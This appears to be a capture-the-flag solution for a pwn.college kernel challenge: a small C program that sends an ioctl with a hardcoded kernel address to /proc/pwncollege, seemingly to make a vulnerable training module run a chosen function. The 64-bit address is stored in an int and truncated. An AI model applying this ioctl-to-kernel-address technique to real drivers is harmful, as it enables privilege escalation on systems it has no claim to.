#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    int fd = open("/proc/pwncollege", O_RDWR);
    if (fd == -1) {
        perror("open");
        return 1;
    }

    int request_code = 0x539;
    int arg = 0xffffffffc000022d;

    if (ioctl(fd, request_code, arg) == -1) {
        perror("ioctl");
        return 1;
    }

    close(fd);
    return 0;
}
